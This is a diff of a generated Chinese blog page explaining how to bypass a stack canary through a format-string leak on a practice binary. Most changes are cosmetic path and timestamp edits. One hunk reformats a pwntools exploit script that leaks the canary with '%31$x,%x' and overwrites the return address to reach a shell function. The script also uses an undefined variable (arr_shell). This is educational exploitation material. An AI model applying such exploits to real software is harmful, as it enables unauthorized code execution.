@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/09/10/Canary绕过(格式化字符串利用)/b7b8e1c128f9b8f531aef4de99ec0186.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/Canary绕过(格式化字符串利用)/f06e293b9d77341a1e5af0033b7df246.png">
 <meta property="og:image" content="http://yoursite.com/2019/09/10/Canary绕过(格式化字符串利用)/75dbb4fe9594be97c4d081af6151fe72.png">
-<meta property="og:updated_time" content="2019-09-10T10:06:27.147Z">
+<meta property="og:updated_time" content="2019-09-10T10:18:10.720Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Canary绕过(格式化字符串利用)">
 <meta name="twitter:description" content="Canary绕过(格式化字符串利用)漏洞代码:123456789101112131415161718192021#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;void  getshell(void) &amp;#123;   system(&quot;/bin/sh&quot;);&amp;#125;void  init() &amp;#1">
@@ -56,7 +56,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="./assets/img/avatar.jpg" class="js-avatar">
+			<img src="/img/avatar.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">怪咖</a></h1>
@@ -112,7 +112,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="./assets/img/avatar.jpg" class="js-avatar">
+				<img src="/img/avatar.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">怪咖</h1>
@@ -188,12 +188,8 @@
 <h4 id="找到main函数的ret地址"><a href="#找到main函数的ret地址" class="headerlink" title="找到main函数的ret地址:"></a><strong>找到main函数的ret地址:</strong></h4><p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/a071431c124bace0697ab210d7b66ab0.png" alt><br>这段代码需要注意下：因为eip指向ret时，esp的值就是ret的地址。<br>那么代码的执行效果如下：<br>pop ecx后，ecx = 0xbffff3a0<br>pop ebx后，ebx = 0x0<br>pop ebp后，ebp = 0x0</p>
 <p>lea esp,[ecx-0x4]后，esp = *(ecx - 0x4) = *(0xbffff3a0 - 0x4) = *(0xbffff39c) = 0xb7df1e81</p>
 <p>如下：<br><img src="/2019/09/10/Canary绕过(格式化字符串利用)/b7b8e1c128f9b8f531aef4de99ec0186.png" alt><br>那么将下面的图补充完整：<br><img src="/2019/09/10/Canary绕过(格式化字符串利用)/f06e293b9d77341a1e5af0033b7df246.png" alt><br>0xbffff380存储了之后将要pop出的ecx的值<br>那么需要在这里伪造出getshell的地址 + 4，那么之后pop ecx, esp = *(&amp;getshell + 4 - 4) = getshell</p>
-<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><p>from  pwn  import  *</p>
-<p>s  =  process(‘./cannry’)<br>libc  =  ELF(‘./cannry’)</p>
-<p>#context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p>
-<p>#gdb.attach(proc.pidof(s)[0])<br>shell_addr  =  libc.symbols[‘getshell’]<br>payload  =  ‘%31$x,%x’<br>s.sendline(payload)<br>res  =  s.recv()<br>cannry_addr  =  int(res.split(‘,’)[0],16)<br>arr_addr  =  int(res.split(‘,’)[1],16)  +  4<br>print  ‘cannry_addr is : ‘  +  hex(cannry_addr)<br>print  ‘arr_addr is : ‘  +  hex(arr_addr)</p>
-<p>payload  =  p32(shell_addr)  +  ‘a’  *  96  +  p32(cannry_addr)  +  p32(arr_shell)</p>
-<p>print  ‘[*] payload is : ‘  +  payload<br>s.sendline(payload)<br>s.interactive()</p>
+<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">s  =  process(<span class="string">'./cannry'</span>)</span><br><span class="line">libc  =  ELF(<span class="string">'./cannry'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['gnome-terminal','-x','sh','-c']</span></span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(s)[0])</span></span><br><span class="line">shell_addr  =  libc.symbols[<span class="string">'getshell'</span>]</span><br><span class="line">payload  =  <span class="string">'%31$x,%x'</span></span><br><span class="line">s.sendline(payload)</span><br><span class="line">res  =  s.recv()</span><br><span class="line">cannry_addr  =  int(res.split(<span class="string">','</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">arr_addr  =  int(res.split(<span class="string">','</span>)[<span class="number">1</span>],<span class="number">16</span>)  +  <span class="number">4</span></span><br><span class="line"><span class="keyword">print</span>  <span class="string">'cannry_addr is : '</span>  +  hex(cannry_addr)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'arr_addr is : '</span>  +  hex(arr_addr)</span><br><span class="line"></span><br><span class="line">payload  =  p32(shell_addr)  +  <span class="string">'a'</span>  *  <span class="number">96</span>  +  p32(cannry_addr)  +  p32(arr_shell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>  <span class="string">'[*] payload is : '</span>  +  payload</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+
 <p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/75dbb4fe9594be97c4d081af6151fe72.png" alt></p>
 
       
@@ -212,7 +208,7 @@
                   <div class="reward-box">
                     
                     <div class="reward-box-item">
-                      <img class="reward-img" src="./assets/img/alipay.jpg">
+                      <img class="reward-img" src="/img/alipay.jpg">
                       <span class="reward-type">支付宝</span>
                     </div>
                     
